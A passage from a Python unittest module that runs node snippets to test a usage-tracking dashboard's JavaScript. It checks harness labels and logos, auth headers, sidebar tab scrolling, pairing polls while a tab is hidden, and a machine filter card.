    def test_zero_spare_hours_drops_the_second_unit(self):
        self.assertEqual(self.reset_in(25 * 86400), "in 25d")
        self.assertEqual(self.reset_in(86400 + 30 * 60), "in 1d")


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestWindowLabel(unittest.TestCase):
    """Fmt.windowLabel: Cursor's buckets read "Cursor models" and
    "Other models"; another harness's lookalike keys keep the generic
    names."""

    def label(self, harness, window):
        src = (FORMAT_JS.read_text(encoding="utf-8")
               + "\nprocess.stdout.write(JSON.stringify(Fmt.windowLabel("
               + json.dumps(harness) + ", " + json.dumps(window) + ")));\n")
        done = subprocess.run(["node", "-e", src], capture_output=True,
                              text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_cursor_buckets(self):
        self.assertEqual(self.label("cursor", "included"), "Cursor models")
        self.assertEqual(self.label("cursor", "api"), "Other models")
        self.assertEqual(self.label("cursor", "auto"), "Auto")
        self.assertEqual(self.label("cursor", "grok_bot"), "Grok Bot")

    def test_other_harnesses_keep_the_generic_names(self):
        self.assertEqual(self.label("claude", "included"), "Included")
        self.assertEqual(self.label("claude", "api"), "API")
        self.assertEqual(self.label("devin", "5h"), "5h")
        self.assertEqual(self.label("devin", None), "Usage")



@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestAuthHeaders(unittest.TestCase):
    """authHeaders marks every request as the page's own with X-Swe-Pair,
    the header's name since the rename (the hub still reads the old one)."""

    def headers(self, cred):
        src = "const credential = () => %s;\n" % json.dumps(cred) + app_js_function("authHeaders") + """
process.stdout.write(JSON.stringify(authHeaders({ "Content-Type": "application/json" })));
"""
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_sends_the_renamed_pair_header(self):
        self.assertEqual(self.headers(""), {"X-Swe-Pair": "1", "Content-Type": "application/json"})
        got = self.headers("tok")
        self.assertEqual(got["Authorization"], "Bearer tok")
        self.assertNotIn("X-Quiver-Pair", got)


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestRevealActiveTab(unittest.TestCase):
    """revealActiveTab: on a phone the sidebar scrolls sideways, and the
    current page's tab must be scrolled into view."""

    def scroll_left(self, nav_width, scroll_width, tab_left, tab_width=80, active=True):
        src = app_js_function("revealActiveTab") + """
const tab = { getBoundingClientRect: () => ({ left: %d, width: %d }) };
const nav = { scrollLeft: 0, scrollWidth: %d, clientWidth: %d,
  querySelector: () => %s,
  getBoundingClientRect: () => ({ left: 0, width: %d }) };
revealActiveTab(nav);
process.stdout.write(JSON.stringify(nav.scrollLeft));
""" % (tab_left, tab_width, scroll_width, nav_width, "tab" if active else "null", nav_width)
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_a_tab_past_the_edge_is_centred(self):
        # Hooks sat at x=1367 in a 375 px row.
        self.assertEqual(self.scroll_left(375, 1800, 1367), 1367 - (375 - 80) / 2)

    def test_a_row_that_fits_or_no_active_tab_stays_put(self):
        self.assertEqual(self.scroll_left(220, 220, 100), 0)
        self.assertEqual(self.scroll_left(375, 1800, 1367, active=False), 0)


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestPairPollWhileHidden(unittest.TestCase):
    """#1554: "Pair with Tailscale" asks for the owner's answer every 2 s,
    but a hidden tab asks nothing; showing it asks at once."""

    PRELUDE = r"""
let pairGen = 1, routeGen = 0, failed = null, answer = "pending";
// Live timers by id; a cleared one is gone.
const timers = new Map(); let nextId = 0;
globalThis.setTimeout = (fn) => { timers.set(++nextId, fn); return nextId; };
globalThis.clearTimeout = (id) => { timers.delete(id); };
const fire = async () => { const [[id, fn]] = timers; timers.delete(id); await fn(); };
const listeners = new Set(), asked = [];
globalThis.document = { hidden: false,
  addEventListener: (t, f) => listeners.add(f), removeEventListener: (t, f) => listeners.delete(f) };
const visibility = async (hidden) => { document.hidden = hidden; for (const f of [...listeners]) f(); await settle(); };
globalThis.fetch = async (url) => { asked.push(url); return { status: 200, json: async () => ({ status: answer, credential: "c" }) }; };
const pairRequestFailed = (m) => { failed = m; };
const pairStore = () => {}; const route = () => {};
globalThis.history = { replaceState() {} };
const settle = () => new Promise((r) => setImmediate(r));
"""

    def run_js(self, body):
        src = app_js_function("pairRequestPoll") + self.PRELUDE + "(async () => {" + body + "})();"
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_a_hidden_tab_waits_for_the_tab_to_show(self):
        out = self.run_js("""
  pairRequestPoll("r1", "s", 1, 0);
  await fire(); const first = asked.length;
  document.hidden = true;
  await fire(); const hidden = [asked.length - first, timers.size];
  await visibility(true);                 // still hidden: asks nothing
  const stillHidden = asked.length - first;
  await visibility(false);
  process.stdout.write(JSON.stringify({ first, hidden, stillHidden, shown: asked.length - first,
    listeners: listeners.size, next: timers.size }));""")
        self.assertEqual(out, {"first": 1, "hidden": [0, 0], "stillHidden": 0, "shown": 1, "listeners": 1, "next": 1})

    def test_showing_the_tab_before_the_tick_asks_at_once(self):
        """Hidden and shown again inside one 2 s wait: the return asks
        now, and the waiting tick is dropped rather than asking twice."""
        out = self.run_js("""
  pairRequestPoll("r1", "s", 1, 0);
  await visibility(true); await visibility(false);
  const shown = [asked.length, timers.size];
  answer = "approved"; await fire();
  process.stdout.write(JSON.stringify({ shown, asked: asked.length, listeners: listeners.size, timers: timers.size }));""")
        self.assertEqual(out, {"shown": [1, 1], "asked": 2, "listeners": 0, "timers": 0})


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestOverviewMachines(unittest.TestCase):
    """Overview's machine filter (#525): the Machines card and header."""

    def run_js(self, body):
        src = ("const esc = (s) => String(s);\n"
               "const Fmt = { tokens: (n) => `${n}t`, dollars: (n) => `$${n}`, ago: () => 'now' };\n"
               + app_js_function("overviewWhere") + app_js_function("machinesCard") + body)
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_card_and_header_follow_the_filter(self):
        out = self.run_js("""
const machines = [{id: 'hub', name: 'Home', hub: true, tokens: 300, cost_usd: 1},
                  {id: 'mbp', name: 'MacBook', hub: false, tokens: 100, cost_usd: 2, reported_at: 1}];
const all = {machine: 'Home', machine_filter: 'all', machines};
const one = {machine: 'Home', machine_filter: 'mbp', machines};
const solo = {machine: 'Home', machines: [machines[0]]};
process.stdout.write(JSON.stringify([overviewWhere(all), overviewWhere(one), overviewWhere(solo),
  machinesCard(all), machinesCard(solo)]));
""")
        all_where, one_where, solo_where, card, solo_card = out
        self.assertEqual(all_where, " across 2 machines")
        self.assertEqual(one_where, " on MacBook")
        self.assertEqual(solo_where, " on Home")
        self.assertIn('data-machine="all"', card)
        self.assertIn("400t · $3", card)  # all machines added up
        self.assertIn('data-machine="mbp"', card)
        self.assertIn("--share:25.0%", card)
        self.assertEqual(solo_card, "")  # one machine: no card


@unittest.skipUnless(shutil.which("node"), "node is not installed")
class TestHarnessMark(unittest.TestCase):
    """Fmt.mark and Fmt.logo, ported from the Mac's HarnessMark and
    HarnessIcons: every shipped logo draws, aliases and second accounts
    draw their base harness's, and a harness with no logo keeps its name
    as the word."""

    def fmt(self, expr):
        src = FORMAT_JS.read_text(encoding="utf-8") + "\nprocess.stdout.write(JSON.stringify(" + expr + "));\n"
        done = subprocess.run(["node", "-e", src], capture_output=True, text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def test_every_shipped_logo_draws(self):
        files = sorted(p.name for p in FORMAT_JS.parent.glob("harness-*.svg"))
        ids = [f[len("harness-"):-len(".svg")].removesuffix("-color") for f in files]
        drawn = self.fmt(json.dumps(ids) + ".map((id) => (Fmt.logo(id).match(/src=\"\\/([^\"]+)\"/) || [])[1] || null)")
        self.assertEqual(drawn, files)

    def test_marks_like_the_mac(self):
        out = self.fmt("['claude', 'claude-desktop', 'grok-bot', 'devin-cloud', 'codex-acc2', 'qwen', 'zed']"
                       ".map((id) => Fmt.mark(id))")
        self.assertEqual(out, [
            {"icon": "claude", "word": "CLI", "name": "Claude Code"},
            {"icon": "claude", "word": "Desktop", "name": "Claude Desktop"},
            {"icon": "grok", "word": None, "name": "Grok Bot"},
            {"icon": "devin", "word": "Cloud", "name": "Devin cloud"},
            {"icon": "codex", "word": "acc2", "name": "Codex (acc2)"},
            {"icon": "qwen", "word": None, "name": "Qwen"},
            {"icon": None, "word": "Zed", "name": "Zed"},
        ])
        logos = self.fmt("[Fmt.logo('claude-desktop'), Fmt.logo('codex-acc2'), Fmt.logo('copilot'), Fmt.logo('zed')]")
        self.assertIn("harness-claude-color.svg", logos[0])
        self.assertIn('alt="Codex (acc2)"', logos[1])
        self.assertIn('class="logo mono" src="/harness-copilot.svg"', logos[2])
        self.assertEqual(logos[3], '<span class="logo" aria-hidden="true"></span>')
        self.assertEqual(self.fmt("Fmt.harnessName('codex-acc2')"), "Codex (acc2)")

    def test_mark_view_is_the_macs_harness_mark_view(self):
        """Skills, AGENTS.md and Hooks each had a copy that drew a second
        account's or Devin cloud's logo without its word."""
        out = self.fmt("['claude', 'claude-desktop', 'codex-acc2', 'devin-cloud', 'grok-bot', 'zed', 'a<b']"
                       ".map((id) => Fmt.markView(id, 'sk-mark'))")
        self.assertEqual(out[0], '<span class="sk-mark" title="Claude Code" aria-label="Claude Code">'
                                 '<img class="logo" src="/harness-claude-color.svg" alt="Claude Code"><span>CLI</span></span>')
        self.assertIn('alt="Claude Desktop"><span>Desktop</span></span>', out[1])
        self.assertIn('alt="Codex (acc2)"><span>acc2</span></span>', out[2])
        self.assertIn('src="/harness-devin.svg" alt="Devin cloud"><span>Cloud</span></span>', out[3])
        self.assertIn('src="/harness-grok.svg" alt="Grok Bot"></span>', out[4])
        self.assertEqual(out[5], '<span class="sk-mark" title="Zed" aria-label="Zed"><span>Zed</span></span>')
        self.assertEqual(out[6], '<span class="sk-mark" title="A&lt;b" aria-label="A&lt;b"><span>A&lt;b</span></span>')
        self.assertIn('class="logo logo-sm mono"', self.fmt("Fmt.markView('cursor', 'hk-mark', 'logo logo-sm')"))

    def test_tilde_shortens_only_paths_under_home(self):
        out = self.fmt("[Fmt.tilde('/h/u/a/b', '/h/u'), Fmt.tilde('/h/user2/a', '/h/u'),"
                       " Fmt.tilde('/h/u', '/h/u'), Fmt.tilde('/h/u/a', ''), Fmt.tilde('/h/u/a', undefined)]")
        self.assertEqual(out, ["~/a/b", "/h/user2/a", "/h/u", "/h/u/a", "/h/u/a"])


if __name__ == "__main__":
    unittest.main()
